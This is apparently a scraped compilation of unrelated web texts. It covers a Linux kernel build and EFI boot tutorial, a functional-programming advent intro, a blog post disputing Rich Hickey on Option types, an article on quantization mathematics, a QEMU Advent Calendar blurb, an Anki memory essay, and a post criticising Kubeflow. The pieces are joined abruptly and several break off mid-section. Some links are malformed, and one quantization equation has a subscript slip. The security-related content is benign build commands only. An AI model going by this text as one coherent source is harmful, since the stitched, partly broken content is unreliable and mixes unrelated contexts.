<p>In case of tarball, it now has to be unpacked with usual:</p>
<pre>tar <span>-xvf</span> linux-*.tar.gz
</pre>
<p>Then, in case of tarball, you got directory with name dependent on you kernel version, in case of git repo, it is simply linux. So we can cd into it, in any of the above cases:</p>
<pre><span>cd</span> linux*
</pre>
<p>In theory at this point, we could set the compiler, we prepared to be run by kernel buildsystem. But this is optional, as we target <code>x86_64</code> platform, that we run our host on, so default compiler should be as good as uClibc variant. I case, you want to use custom one, you have to export the following:</p>
<pre><span>export</span> <span>CROSS_COMPILE</span>=x86_64-linux-uclibc-
</pre>
<p>Now, we have to configure our kernel.</p>
<p>First step is to choose defconfig. Possible values can be listed in case of x86 with:</p>
<pre><span>ls</span> arch/x86/configs/
</pre>
<p>At the time of writing this returned the following options:</p>
<pre>i386_defconfig tiny.config x86_64_defconfig xen.config
</pre>
<p>As you can see, there are only a few. So, we do:</p>
<pre>make x86_64_defconfig
</pre>
<p>At this point, we are ready to compile. In case, you want to do some modifications, you could do:</p>
<pre>make menuconfig
</pre>
<p>And select (or deselect) some options there. If you think, you are ready, you can type:</p>
<pre>make <span>-j</span>
</pre>
<p>And wait couple of minutes (up to half an hour), depending on speed of your PC. Afterwards, you should see that <code>bzImage</code> has been made and is available at <code>arch/x86/boot/bzImage</code>. We can copy it somewhere in order to not accidentally start its recompilation:</p>
<pre>cp arch/x86/boot/bzImage ../
</pre>
<h2>Testing on hardware</h2>
<p>At this point, it is possible to run the kernel on our system. If you don’t have Secure Boot enabled, then you can try to copy the kernel to you EFI System Partition (wherever it is, I will call this path <code>ESP</code> from now on). But first create new directory for your distro:</p>
<pre><span>mkdir</span> <span>-p</span> ESP/EFI/linux
cp arch/x86/boot/bzImage ESP/EFI/linux/linuxx64.efi
</pre>
<p>I am changing the name in the meantime, as I heard that some systems does not like binaries without <code>.efi</code> extension. Now, we can try to boot.There is more than one way to do it. The one that works always is to utilize EFI firmware directly. But this one differs significantly between manufacturers, so if you prefer that one, please refer to his support pages. The other is to use one of existing tools. For sure KeyTool, that manages Secure Boot keys, is able to start any executable from ESP by browsing the filesystem. But the way I would like to show is, by using so called EFI shell. Why? Because EFI shell allows us to experiment with kernel parameters, by simply typing them, as we would start new user program. And, in fact, from EFI perspective, we simply start a new program.</p>
<p>There are many shells in the wild. I tried EDK2, that is available on Arch as <code>edk2-shell</code> package. It is then available at <code>/usr/share/edk2-shell/x64/Shell.efi</code> You can simply copy it to <code>ESP</code>, just like with kernel, then you have to add it to your EFI boot manager, or use boot manager that is able to autodetect it. You can find a bunch of resources on how to do it, even from inside Linux. But, please do not add the kernel, you copied in such way, to boot manager, as we will play with it a bit, later. Now, in EFI shell, you will be presented with a list of partitions, that the shell has detected. This might be not so obvious at first, but, somehow, you have to identify the one, that is you EFI partition. You should see a similar numbering to the one you see in Linux console, when you list with e.g. <code>lsblk</code>. You can try guessing it by typing its name, in similar way as in Windows, e.g.:</p>
<pre>FS0:
</pre>
<p>to switch to <code>FS0</code> partition. Then you can simply type ls to list its content. Once, you found the right one, it’s worth to remember it, as you might need it couple of times. How many, depends on how many problems, you would have.</p>
<p>Then go to the directory, where you copied your kernel:</p>
<pre><span>cd</span> EFI\linux
</pre>
<p>And ls to make sure, it is there. Now, we are ready to call it:</p>
<pre>linuxx64.efi
</pre>
<p>Yes. It’s as simple as that. But this will fail. We did not provide any root filesystem for our kernel, so it will gonna panic. But don’t worry, as long as reason of the panic is like that:</p>
<pre>not syncing: VFS: Unable to mount root fs on unknown-block(0,0)
</pre>
<p>then it was expected. In case of any other error, act accordingly, as this may be hardware dependent. So, probably, something has to be reconfigured in menuconfig.</p>
<h2>Testing in qemu</h2>
<p>It’s quite a nice option to be able to test your work on real hardware. However, in my opinion, it is much easier to do it in virtualized environment, that you can quickly reset at any time and where you would have latest binaries for testing, all the time, without wasting time for flashing them somewhere.

Every day until December 24th you will get an article, video or other functional programming related content that hopefully will make the waiting feel a bit shorter! 😄</p>
</section><article><section><p>As previous years the articles will span a large range of topics and complexity. If you are looking for something beginner friendly, or more advanced topics, there should be something for everyone these next 23 days.</p>
<p>Let’s start this advent of with a look at the basics: what is functional programming (FP)? This question has been answered many times before, in many different ways. <a href="https://functional.christmas/2019/1">We took our own stab at it last year</a>. Even though there are no single definition for FP and many different ways to approach it, there are some things that are shared throughout the related communities.</p>

<p>Today I want to use the words and pictures of Russ Olsen and highlight his talk from GOTO 2018. Russ is a great communicator and I love the down to earth and practical perspective he brings in this talk. He explains functional programming in an understandable way and shows why people prefer FP. I hope you enjoy! </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>I recently watched a talk named <em><a href="https://blog.jonstodle.com/in-which-i-claim-rich-hickey-is-wrong/%5Bhttps://youtu.be/YR5WdGrpoug%5D(https://youtu.be/YR5WdGrpoug?t=464)">Maybe Not</a></em> by Rich HIckey, the creator of Clojure. I can't claim to be on his level when it comes to language design, but I will postulate that his arguments at the <a href="https://blog.jonstodle.com/in-which-i-claim-rich-hickey-is-wrong/%5Bhttps://youtu.be/YR5WdGrpoug?t=464%5D(https://youtu.be/YR5WdGrpoug?t=464)">7:45 minute mark</a> and about 2.5 minutes of watching, is wrong.</p>
<p>The subject he's covering is explicit "null" checks in languages that have an explicit type representing a missing value.</p>
<p>Languages like Haskell, F# and Rust express this through a type which may contain a value, or may not. You are then required to explicitly check whether the value is present before being able to use it. This is in contrast to languages like Java or C# which don't require you to do null checks, which might lead to null reference, or null pointer exceptions, respectively.</p>
<p>Back to Rich Hickey. He argues that changing an argument to a function from being explicitly non-null, to being possibly-null should not be a breaking change:</p>
<pre><span>// From this
</span><span>fn </span><span>do_something</span><span>(</span><span>value</span><span>: string) {}

</span><span>// To this
</span><span>fn </span><span>do_something</span><span>(</span><span>value</span><span>: Option&lt;string&gt;) {}
</span></pre>
<p>He argues that you are easing up on the requirements, and this shouldn't break existing callers: they are technically still passing valid values. He also argues the same for tightening the possible values for a return value:</p>
<pre><span>// From this
</span><span>fn </span><span>return_something</span><span>() -&gt; Option&lt;string&gt; {}

</span><span>// To this
</span><span>fn </span><span>return_something</span><span>() -&gt; string {}
</span></pre>
<p>Callers of this function might do a superfluous check for a value, but their code would still work.</p>
<p><a href="https://blog.jonstodle.com/in-which-i-claim-rich-hickey-is-wrong/%5Bhttps://youtu.be/YR5WdGrpoug?t=464%5D(https://youtu.be/YR5WdGrpoug?t=464)">Watch the 2.5 minutes for a better explanation</a>.</p>

<p>Rich Hickey argues that these are not breaking changes, and should not require the callers to change their code - just because the internal implementation of the function became a little better.</p>
<p>This is missing part of the point. <strong>Why did the internals of the function change?</strong></p>
<p>Was it just because of an extra null check, or a new default fallback value? Has it become significant that you can pass a null value now? Is it significant that the operation now always seems to succeed, by never returning a null value?</p>
<p>You've changed the meaning of these values, and callers of this function should adapt to this new reality. Continuing to pass in the same values, or handle the same return values, in the same way as before should not be considered safe.</p>
<p>If there wasn't a change in behavior, why are you changing the contract?</p>
<p>You are changing the behavior of the function. <strong>That is a breaking change.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Quantization refers to techniques for performing computations and storing tensors at lower bitwidths than floating point precision. A quantized model executes some or all of the operations on tensors with integers rather than floating point values. This allows for a more compact model representation and the use of high performance vectorized operations on many hardware platforms. This technique is in particular useful at the inference time since it saves a lot of inference computation cost without sacrificing too much inference accuracies.</p>



<p>So far, major deep learning frameworks, such as TensorFlow and PyTorch, have supported quantization natively. The users have been using the built-in quantization modules successfully without knowing how it works exactly. In this article, I would like to elucidate the mathematics of quantization for neural networks so that the developers would have some ideas about the quantization mechanisms.</p>

<h3 id="quantization">Quantization</h3>

<h4 id="quantization-mapping">Quantization Mapping</h4>

<p>Quantization maps a floating point value $x \in [\alpha, \beta]$ to a $b$-bit integer $x_q \in [\alpha_q, \beta_q]$.</p>



<p>Mathematically, the de-quantization process is defined as</p><p>

\[x = c (x_q + d)\]

</p><p>and the quantization process is defined as</p><p>

\[x_q = \text{round}\big(\frac{1}{c} x - d\big)\]

</p><p>where $c$ and $d$ are variables.</p>



<p>In order to derive $c$ and $d$, we have to make sure that $\alpha$ maps to $\alpha_q$ and $\beta$ maps to $\beta_q$. So we would just have to solve the linear system</p><p>

\[\begin{align}
\beta &amp;= c (\beta_q + d) \\
\alpha &amp;= c (\alpha_q + d) \\
\end{align}\]

</p><p>The solutions is</p><p>

\[\begin{align}
c &amp;= \frac{\beta - \alpha}{\beta_q - \alpha_q} \\
d &amp;= \frac{\alpha \beta_q - \beta \alpha_q}{\beta - \alpha} \\
\end{align}\]

</p><p>In practice, we would have to ensure that $0$ in floating point is represented exactly with no error after quantization.</p>



<p>Mathematically, we need to ensure</p><p>

\[\begin{align}
x_q &amp;= \text{round}\big(\frac{1}{c} 0 - d\big) \\
&amp;= \text{round}(- d) \\
&amp;= - \text{round}(d) \\
&amp;= - d \\
\end{align}\]

</p><p>This means that</p><p>

\[\begin{align}
d &amp;= \text{round}(d) \\
&amp;= \text{round}\big(\frac{\alpha \beta_q - \beta \alpha_q}{\beta - \alpha}\big) \\
\end{align}\]

</p><p>By convention, we denote $c$ as the scale $s$ and $-d$ as the zero point $z$.</p>



<p>To summarize, the de-quantization process is defined as</p><p>

\[x = s (x_q - z)\]

</p><p>and the quantization process is defined as</p><p>

\[x_q = \text{round}\big(\frac{1}{s} x + z\big)\]

</p><p>The value of scale $s$ and zero point $z$ are</p><p>

\[\begin{align}
s &amp;= \frac{\beta - \alpha}{\beta_q - \alpha_q} \\
z &amp;= \text{round}\big(\frac{\beta \alpha_q - \alpha \beta_q}{\beta - \alpha}\big) \\
\end{align}\]

</p><p>Note that $z$ is an integer and $s$ is a <em>positive</em> floating point number.</p>

<h4 id="value-clipping">Value Clipping</h4>

<p>In practice, the quantization process will have chance to have $x$ that is outside the range of $[\alpha, \beta]$, thus the quantized value $x_q$ will also be outside the range of $[\alpha_q, \beta_q]$. If the integer type is signed <code>INTb</code> and $(\alpha_q, \beta_q) = (-2^{b-1}, 2^{b-1}-1)$, or unsigned <code>UINTb</code> and $(\alpha_q, \beta_q) = (0, 2^{b}-1)$, programming languages that have fixed type-precisions will clip the values that are outside the range.</p>



<p>More concretely, the quantization process will have an additional clip step.</p><p>

\[x_q = \text{clip}\Big( \text{round}\big(\frac{1}{s} x + z\big), \alpha_q, \beta_q \Big)\]

</p><p>where $\text{clip}(x, l, u)$ function is defined as</p><p>

\[\begin{align}
\text{clip}(x, l, u) &amp;= 
    \begin{cases}
      l &amp; \text{if $x &lt; l$}\\
      x &amp; \text{if $l \leq x \leq u$}\\
      u &amp; \text{if $x &gt; u$}\\
    \end{cases} 
\end{align}\]

</p><h4 id="affine-quantization-mapping">Affine Quantization Mapping</h4>

<p>The quantization mapping we discussed above is also called affine quantization mapping.</p>

<h4 id="scale-quantization-mapping">Scale Quantization Mapping</h4>

<p>If the integer type is signed <code>INTb</code>, $(\alpha_q, \beta_q) = (-2^{b-1} + 1, 2^{b-1}-1)$ and we force $z = 0$.</p>



<p>Mathematically, we have</p><p>

\[\begin{gather}
\alpha_q = -\beta_q \\
\text{round}\big(\frac{\beta \alpha_q - \alpha \beta_q}{\beta - \alpha}\big) = 0 \\
\end{gather}\]

</p><p>This results in $\alpha = -\beta$. Therefore, we are mapping between the floating point range $[\alpha, -\alpha]$ and the integer range $[\alpha_q, -\alpha_q]$. Because it is exactly symmetric around $0$, we also call it symmetric quantization mapping.</p>



<p>Note that scale quantization mapping is just a special case of the affine quantization mapping, and we have an unused bit in the integer range.</p>

<h4 id="summary">Summary</h4>

<p>The quantization function is defined as</p><p>

\[f_q(x, s, z) = \text{clip}\Big( \text{round}\big(\frac{1}{s} x + z\big), \alpha_q, \beta_q \Big)\]

</p><p>and the de-quantization function is defined as</p><p>

\[f_d(x_q, s, z) = s (x_q - z)\]

</p><h3 id="quantized-matrix-multiplication">Quantized Matrix Multiplication</h3>

<h4 id="quantized-matrix-multiplication-mathematics">Quantized Matrix Multiplication Mathematics</h4>

<p>Suppose we have to perform the matrix multiplication $Y = XW + b$, where $X \in \mathbb{R}^{m \times p}$, $W \in \mathbb{R}^{p \times n}$, and $b \in \mathbb{R}^{n}$ resulting in $Y \in \mathbb{R}^{m \times n}$.</p><p>

\[\begin{align}
Y_{i, j} = b_j + \sum_{k=1}^{p} X_{i,k} W_{k,j}
\end{align}\]

</p><p>We would need to do $p$ floating number multiplications and $p$ floating number additions to compute one single entry in $Y$. To complete the full matrix multiplication, given there are $mn$ entries in $Y$, we would need to do $mpn$ floating number multiplications and $mpn$ floating number additions.</p>



<p>Depending on the floating number precision, such the speed of such floating point matrix multiplication might not be favored. So the question becomes can we complete the same matrix multiplication using quantized values.</p>



<p>Here we apply the de-quantization equation.</p><p>

\[\begin{align}
Y_{i, j} &amp;= b_j + \sum_{k=1}^{p} X_{i,k} W_{k,j} \\
&amp;= s_b (b_{q, j} - z_b) + \sum_{k=1}^{p} s_X(X_{q,i,k} - z_X) s_W(W_{q, k,j} - z_W)\\
&amp;= s_b (b_{q, j} - z_b) + s_X s_W \sum_{k=1}^{p} (X_{q,i,k} - z_X) (W_{q, k,j} - z_W)\\
&amp;= s_b (b_{q, j} - z_b) + s_X s_W \Bigg[ \bigg( \sum_{k=1}^{p} X_{q,i,k} W_{q, k,j} \bigg) - \bigg( z_W \sum_{k=1}^{p} X_{q,i,k} \bigg) - \bigg( z_X \sum_{k=1}^{p} W_{q, k,j} \bigg) + p z_X z_W\Bigg]\\
&amp;= s_Y(Y_{q,i,j} - z_Y)\\
\end{align}\]

</p><p>where $X_q$, $W_q$, $b_q$ and $Y_q$ are the quantized matrix for $X$, $W$, $b$ and $Y$, respectively, $s_X$, $s_W$, $s_b$, and $s_Y$ are the scales for $X$, $W$, $b$ and $Y$, respectively, and $z_X$, $z_W$, $z_b$ and $z_Y$ are the zero points for $X$, $W$, $b$ and $Y$, respectively.</p>



<p>Therefore,</p><p>

\[Y_{q,i,j} = z_Y + \frac{s_b}{s_Y} (b_{q, j} - z_b) + \frac{s_X s_W}{s_Y} \Bigg[ \bigg( \sum_{k=1}^{p} X_{q,i,k} W_{q, k,j} \bigg) - \bigg( z_W \sum_{k=1}^{p} X_{q,i,k} \bigg) - \bigg( z_X \sum_{k=1}^{p} W_{q, k,j} \bigg) + p z_X z_W\Bigg]\]

</p><p>Note that in the above equation the following terms are constants during inference and therefore could be computed offline before inference.</p>

<ul>
  <li>$z_Y$</li>
  <li>$\frac{s_b}{s_Y} (b_{q, j} - z_b)$</li>
  <li>$z_X \sum_{k=1}^{p} W_{q, k,j}$</li>
  <li>$p z_X z_W$</li>
</ul>

<p>Term $\sum_{k=1}^{p} X_{q,i,k} W_{q, k,j}$ suggests that we could just do the integer matrix multiplication for $X_q$ and $W_q$. Such integer matrix multiplication could employ special hardware and algorithms, such as <a href="https://www.nvidia.com/en-us/data-center/tensor-cores/">NVIDIA Tensor Core</a> and <a href="https://docs.nvidia.com/cuda/ampere-tuning-guide/index.html#tensor-operations">Tensor Core IMMA operations</a>, and runs much faster than conventional integer matrix multiplication.</p>

    <figcaption>NVIDIA Tensor Core Operations</figcaption>
</figure>
</div>

<p>One additional thing to note is that $s_X$, $s_W$, $s_Y$, $z_X$, $z_W$, and $z_Y$ are floating point and integer constants, instead of variables. So there could be some special compile-time optimizations for those multiplications.</p>



<p>This could be retrieved from the resulting integer matrix from $X_q$ and $W_q$ multiplication, which is much faster than the floating number matrix multiplication for the same sizes.</p>



<p>The significance of such quantized matrix multiplication is that the product integer matrix could be converted back to floating point matrix using the scale and the zero point of the product integer matrix and it is almost numerically equivalent. If we have to do a sequence of matrix multiplications whose inputs and outputs are floating point numbers, for example</p><p>

\[\begin{align}
X_1 &amp;= X_0 W_0 + b_0\\
X_2 &amp;= X_1 W_1 + b_1\\
&amp;\vdots \\
X_n &amp;= X_n W_n + b_n\\
\end{align}\]

</p><p>We could convert the math to the followings using quantized matrices.</p><p>

\[\begin{align}
X_{0, q} &amp;= f_q(X_0, s_{X_0}, z_{X_0})\\
X_{1, q} &amp;= f_m(X_{0, q}, W_{0, q}, b_{0, q}, s_{X_0}, z_{X_0}, s_{W_0}, z_{W_0}, s_{b_0}, z_{b_0}, s_{X_1}, z_{X_1}) \\
X_{2, q} &amp;= f_m(X_{1, q}, W_{1, q}, b_{1, q}, s_{X_1}, z_{X_1}, s_{W_1}, z_{W_1}, s_{b_1}, z_{b_1}, s_{X_2}, z_{X_2}) \\
&amp;\vdots \\
X_{n, q} &amp;= f_m(X_{n-1, q}, W_{n-1, q}, b_{n-1, q}, s_{X_{n-1}}, z_{X_{n-1}}, s_{W_{n-1}}, z_{W_{n-1}}, s_{b_{n-1}}, z_{b_{n-1}}, s_{X_n}, z_{X_n}) \\
X_n &amp;= f_d(X_{n, q}, s_{X_n}, z_{X_n})
\end{align}\]

</p><p>where $f_q$ is the quantization function, $f_m$ is the quantized matrix multiplication function, and $f_d$ is the de-quantization function.</p>

<h4 id="examples">Examples</h4>

<p>In the following example, we simulated the quantization matrix multiplication of $Y = XW + b$ using random matrix $X$, $W$ and $b$.</p>

        <h2>About</h2>
        <p>
          The QEMU Advent Calendar 2020 features a QEMU disk image each day of
          December until the 24th. Each day a new package becomes available
          for download.
        </p>
        <p>
          Every download contains a little 'run' shell script that starts the
          QEMU emulator with the recommended parameters for the disk image.
          Disk images are either contained directly in the download or are
          downloaded by the 'run' script (you need to have installed 'curl' or
          'wget' in that case).
        </p>
        <p>
          The disk images contain interesting operating systems and software
          that run under the QEMU emulator. Some of them are well-known or
          not-so-well-known operating systems, old and new, others are custom
          demos and neat algorithms.
        </p>

      <p>
      One day in the mid-1920s, a Moscow newspaper reporter named
      Solomon Shereshevsky entered the laboratory of the psychologist
      Alexander Luria. Shereshevsky's boss at the newspaper had
      noticed that Shereshevsky never needed to take any notes, but
      somehow still remembered all he was told, and had suggested he
      get his memory checked by an expert.
    </p>

    <p>
      Luria began testing Shereshevsky's memory. He began with simple
      tests, short strings of words and of numbers. Shereshevsky
      remembered these with ease, and so Luria gradually increased the
      length of the strings. But no matter how long they got,
      Shereshevsky could recite them back.  Fascinated, Luria went on
      to study Shereshevsky's memory for the next 30 years.  In a book
      summing up his research*<span>* Alexander
      Luria, “The Mind of a Mnemonist”, Harvard University
      Press (1968).</span>, Luria reported that:
    </p>

    <blockquote>
      [I]t appeared that there was no limit either to
      the <em>capacity</em> of S.'s memory or to the <em>durability of
      the traces he retained</em>. Experiments indicated that he had
      no difficulty reproducing any lengthy series of words whatever,
      even though these had originally been presented to him a week, a
      month, a year, or even many years earlier. In fact, some of
      these experiments designed to test his retention were performed
      (without his being given any warning) fifteen or sixteen years
      after the session in which he had originally recalled the
      words. Yet invariably they were successful.
    </blockquote>
      
    <p>
      Such stories are fascinating. Memory is fundamental to our
      thinking, and the notion of having a perfect memory is
      seductive.  At the same time, many people feel ambivalent about
      their own memory. I've often heard people say “I don't
      have a very good memory”, sometimes sheepishly, sometimes
      apologetically, sometimes even defiantly.
    </p>

    <p>
      Given how central memory is to our thinking, it's natural to ask
      whether computers can be used as tools to help improve our
      memory. This question turns out to be highly generative of good
      ideas, and pursuing it has led to many of the most important
      vision documents in the history of computing. One early example
      was Vannevar Bush's 1945 proposal*<span>*
      Vannevar
      Bush, <a href="https://www.theatlantic.com/magazine/archive/1945/07/as-we-may-think/303881/">As
      We May Think</a>, The Atlantic (1945).</span> for a mechanical
      memory extender, the memex. Bush wrote:
    </p>

    <blockquote>
      A memex is a device in which an individual stores all his books,
      records, and communications, and which is mechanized so that it
      may be consulted with exceeding speed and flexibility. It is an
      enlarged intimate supplement to his memory.
    </blockquote>

    <p>
      The memex vision inspired many later computer pioneers,
      including Douglas Engelbart's ideas about the augmentation of
      human intelligence, Ted Nelson's ideas about hypertext, and,
      indirectly, Tim Berners-Lee's conception of the world wide
      web*<span>* See, for example: Douglas
      Engelbart, <a href="http://augmentingcognition.com/assets/Engelbart1962.pdf">Augmenting Human
      Intellect</a> (1962); Ted
      Nelson, <a href="https://dl.acm.org/citation.cfm?id=806036">Complex
      information processing: a file structure for the complex, the
      changing and the indeterminate</a> (1965); and Tim
      Berners-Lee, <a href="https://w3.org/History/1989/proposal.html">Information
      Management: a Proposal</a> (1989).</span>. In his proposal for
      the web, Berners-Lee describes the need for his employer (the
      particle physics organization CERN) to develop a collective
      institutional memory,
    </p>

    <blockquote>
      a pool of information to develop which could grow and evolve
      with the organization and the projects it describes.
    </blockquote>


    <p>
      These are just a few of the many attempts to use computers to
      augment human memory. From the memex to the web to wikis to
      <a href="https://orgmode.org/">org-mode</a>
      to <a href="https://en.wikipedia.org/wiki/Project_Xanadu">Project
      Xanadu</a> to attempts
      to <a href="https://users.speakeasy.net/~lion/nb/book.pdf">make
      a map of every thought a person thinks</a>: the augmentation of
      memory has been an extremely generative vision for computing.
    </p>

      <p>
	In this essay we investigate personal memory systems, that is,
	systems designed to improve the long-term memory of a single
	person. In the first part of the essay I describe my personal
	experience using such a system, named Anki. As we'll see, Anki
	can be used to remember almost anything. That is, Anki makes
	memory a <em>choice</em>, rather than a haphazard event, to be
	left to chance. I'll discuss how to use Anki to understand
	research papers, books, and much else. And I'll describe
	numerous patterns and anti-patterns for Anki use. While Anki
	is an extremely simple program, it's possible to develop
	virtuoso skill using Anki, a skill aimed at understanding
	complex material in depth, not just memorizing simple facts.
      </p>

      <p>
	The second part of the essay discusses personal memory systems
	in general. Many people treat memory ambivalently or even
	disparagingly as a cognitive skill: for instance, people often
	talk of “rote memory” as though it's inferior to
	more advanced kinds of understanding. I'll argue against this
	point of view, and make a case that memory is central to
	problem solving and creativity. Also in this second part,
	we'll discuss the role of cognitive science in building
	personal memory systems and, more generally, in building
	systems to augment human cognition.  In a future
	essay, <a href="http://augmentingcognition.com/taylip.html">Toward a Young Lady's Illustrated
	Primer</a>, I will describe more ideas for personal memory
	systems.
      </p>

      <p>
	The essay is unusual in style. It's not a conventional
	cognitive science paper, i.e., a study of human memory and how
	it works. Nor is it a computer systems design paper, though
	prototyping systems is my own main interest. Rather, the essay
	is a distillation of informal, <em>ad hoc</em> observations
	and rules of thumb about how personal memory systems work. I
	wanted to understand those as preparation for building systems
	of my own. As I collected these observations it seemed they
	may be of interest to others. You can reasonably think of the
	essay as a how-to guide aimed at helping develop virtuoso
	skills with personal memory systems. But since writing such a
	guide wasn't my primary purpose, it may come across as a
	more-than-you-ever-wanted-to-know guide.
      </p>

      <p>
	To conclude this introduction, a few words on what the essay
	won't cover. I will only briefly discuss visualization
	techniques such as memory palaces and the method of loci.  And
	the essay won't describe the use of pharmaceuticals to improve
	memory, nor possible future brain-computer interfaces to
	augment memory. Those all need a separate treatment. But, as
	we shall see, there are already powerful ideas about personal
	memory systems based solely on the structuring and
	presentation of information.
      </p>

      <h2>Part I: How to remember almost anything: the Anki
      system</h2>

    <p>
      I'll begin with an account of my own experience with the
      personal memory
      system <a href="https://apps.ankiweb.net/">Anki</a>*<span>*
      I've no affiliation at all with Anki. Other similar systems
      include <a href="https://mnemosyne-proj.org/">Mnemosyne</a>
      and <a href="https://supermemo.com/">SuperMemo</a>. My limited
      use suggests Mnemosyne is very similar to Anki.  SuperMemo runs
      only on Windows, and I haven't had an opportunity to use it,
      though I have been influenced by essays on
      the <a href="https://supermemo.com/">SuperMemo
      website</a>.<p>I won't try to hide my enthusiasm for Anki
      behind a respectable facade of impartiality: it's a significant
      part of my life. Still, it has many limitations, and I'll
      mention some of them through the essay. </p></span>. The material
      is, as mentioned above, quite personal, a collection of my own
      observations and informal rules of thumb.  Those rules of thumb
      may not apply to others; indeed, I may be mistaken about how
      well they apply to me. It's certainly not a properly controlled
      study of Anki usage!  Still, I believe there is value in
      collecting such personal experiences, even if they are anecdotal
      and impressionistic. I am not an expert on the cognitive science
      of memory, and I'd appreciate corrections to any errors or
      misconceptions.
    </p>

    <!--
      <p>
	Before we begin, a warning. Systems such as Anki are, in my
	opinion, powerful, and the early parts of the essay sound like
	a sales pitch.  It's certainly true that Anki has become an
	important part of my life. But it's also required a great deal
	of work to learn to use well. As we'll discuss, it required
	several failed attempts to make it worth using. So it's not a
	panacea; later, we'll discuss some shortcomings and possible
	improvements. That said, I do believe the underlying
	principles are powerful and important and deserve serious
	consideration.
      </p>
      -->
    
      <p>
	At first glance, Anki seems nothing more than a computerized
      flashcard program. You enter a question:
    </p>

   <p><img src="http://augmentingcognition.com/assets/Anki_question.png"></p><p>
      And a corresponding answer:
    </p>

    <p><img src="http://augmentingcognition.com/assets/Anki_answer.png"></p><p>
      Later you'll be asked to review the card: that is, shown the
      question, and asked whether you know the answer or not.
    </p>

    <p>
      What makes Anki better than conventional flashcards is that it
      manages the review schedule. If you can answer a question
      correctly, the time interval between reviews gradually
      expands. So a one-day gap between reviews becomes two days, then
      six days, then a fortnight, and so on. The idea is that the
      information is becoming more firmly embedded in your memory, and
      so requires less frequent review. But if you ever miss an
      answer, the schedule resets, and you again have to build up the
      time interval between reviews.
    </p>

    <p>
      While it's obviously useful that the computer manages the
      interval between reviews, it perhaps doesn't seem like that big
      a deal.  The punchline is that this turns out to be a far more
      efficient way to remember information.
    </p>

    <p>
      How much more efficient?
    </p>

    <p>
      To answer that question, let's do some rough time estimates.  On
      average, it takes me about 8 seconds to review a card. Suppose I
      was using conventional flashcards, and reviewing them (say) once
      a week. If I wanted to remember something for the next 20 years,
      I'd need 20 years times 52 weeks per year times 8 seconds per
      card. That works out to a total review time of just over 2 hours
      for each card.
    </p>

    <p>
      By contrast, Anki's ever-expanding review intervals quickly rise
      past a month and then out past a year. Indeed, for my personal
      set of Anki cards the average interval …</p></div></div>

<div>
<p>Kubernetes is one of the most important pieces of software produced in the last decade and one of the most influential open source projects ever. Kubernetes has completely revolutionized how applications are developed and how infrastructure is deployed and managed.</p>
<p>With Kubernetes’ explosive rise, more and more physical hardware is being managed by Kubernetes. This trend has coincided with an explosion in the popularity of deep learning, an extremely computation-demanding technology that can result in a single data scientist occupying dozens of GPUs for weeks at a time. This has led to an obvious development:</p>
<p>
Tools that allow data scientists to train models using hardware that is managed by Kubernetes.
</p>
<p>This seems great! Give data scientists access to more hardware. The problem is that a bunch of tools out there are actually:</p>
<p>
Tools that require data scientists to use Kubernetes to train models.
</p>
<p>This may sound like the same thing but it’s not — making hardware more accessible is great, but not if you force data scientists to understand Kubernetes first. <strong>Kubernetes was built by software engineers, for software engineers.</strong></p>
<p><img src="https://determined.ai/assets/images/blogs/kubernetes-bad/kubeflow-unicorns.png" alt="Most data scientists are not software engineers, and most software engineers are not data scientists."></p>
<p>If you happen to be a Unicorn, congratulations! Use your magic to wield Kubernetes and Deep Learning together and build something beautiful. For everyone else (most of us!), you’ll instead be pretty annoyed that you need to deep dive into computer systems before you can make progress developing new ML models. The crazy thing is, this hassle is completely avoidable! We just need to start developing <strong>ML tools built for data scientists, not software engineers.</strong></p>

<p>Let’s take a quick look at <a href="https://www.kubeflow.org/">Kubeflow</a> to understand what I mean about data science tools that are built for software engineers. Kubeflow started as an adaptation of how Google was running TensorFlow internally, as a tool that allowed <em>TensorFlow to run on Kubernetes</em>. This technology was <em>very</em> impactful, creating a much simpler way to use hardware managed by Kubernetes to do deep learning.</p>
<p>That initial version of Kubeflow is now the Kubeflow component called <a href="https://www.kubeflow.org/docs/components/training/tftraining/">TFJob</a>. Without TFJob, running TensorFlow on Kubernetes would be miserable — you would need to specify a complex topology of containers, networking, and storage before you could even start writing your ML code. With TFJob, this is simplified, but, crucially, <em>it is not nearly simple enough</em>. To use TFJob, you need to:</p>
<p><strong><em>Wrap your ML code up neatly in a container</em></strong>. This will be a clunky experience that will require you to package your code and upload it if you want to make changes. Docker is great, but this will slow down your development cycle significantly.</p>
<p><strong><em>Write a Kubernetes TFJob manifest.</em></strong> This might not sound that intimidating, but for a data scientist not fluent in Kubernetes it can be a daunting task. To do this well, you’ll need to learn <em>a lot</em> about Kubernetes — a far cry from the Python that these scientists are used to. Let’s look at the <em>most simple version of this, from the Kubeflow docs:</em></p>
<div><div><pre><code>apiVersion: kubeflow.org/v1
kind: TFJob
metadata:
  generateName: tfjob
  namespace: your-user-namespace
spec:
  tfReplicaSpecs:
    PS:
      replicas: 1
      restartPolicy: OnFailure
      template:
        metadata:
          annotations:
            sidecar.istio.io/inject: "false"
        spec:
          containers:
          - name: tensorflow
            image: gcr.io/your-project/your-image
            command:
              - python
              - -m
              - trainer.task
              - --batch_size=32
              - --training_steps=1000
    Worker:
      replicas: 3
      restartPolicy: OnFailure
      template:
        metadata:
          annotations:
            sidecar.istio.io/inject: "false"
        spec:
          containers:
          - name: tensorflow
            image: gcr.io/your-project/your-image
            command:
              - python
              - -m
              - trainer.task
              - --batch_size=32
              - --training_steps=1000
</code></pre></div></div>
<p>This configuration file is <strong>full</strong> of concepts that are foreign to most data scientists. Pods, replicas, sidecars, restart policies, Kubernetes APIs — all of this is confusing, complex, and detracts from our ability to focus on data science.</p>
<p><strong><em>Learn the Kubernetes CLI.</em></strong> This is minor, but again navigating Kubernetes is not a trivial thing to figure out. Submitting jobs may be relatively straightforward, but seeing results, artifacts, and logs of experiments is unintuitive and clunky.</p>
<hr>
<p>Let’s revisit where this all came from: an adaptation of the technology that <strong>Google used to train DL models</strong>. Google (unlike most of the rest of the world) is filled with unicorns — running Deep Learning on Kubernetes is not a big deal! What is best for Google isn’t always best for the rest of the world though, and in this case I’ve personally seen a lot of <em>very skilled data scientists</em> bounce off of Kubeflow because Kubernetes was too far outside of their comfort zone.</p>
<hr>
